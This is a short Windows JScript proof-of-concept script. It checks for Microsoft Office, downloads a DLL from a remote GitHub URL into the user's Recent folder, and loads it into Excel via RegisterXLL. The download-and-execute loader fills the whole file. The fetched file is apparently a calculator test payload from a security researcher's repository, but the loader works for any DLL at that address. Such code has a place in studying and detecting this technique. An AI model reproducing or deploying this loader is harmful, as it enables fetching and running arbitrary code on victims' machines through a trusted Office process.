FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))   
{   
	WScript.Echo("[+] Find Microsoft Office."); 
	WScript.Echo("[+] Download file...");
	h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
	h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);
	h.Send();
	s=new ActiveXObject("ADODB.Stream");
	s.Type=1;
	s.Open();
	s.Write(h.ResponseBody);
	x=new ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";
	s.SaveToFile(x,2);

	WScript.Echo("[+] Download Success.");
	WScript.Echo("[+] Load dll...");	 
	e= new ActiveXObject("Excel.Application");
	e.RegisterXLL(x);
	WScript.Echo("[+] Load dll Success.");	  
}
else
{
	WScript.Echo("[!] I can't find Microsoft Office!");  	   
}
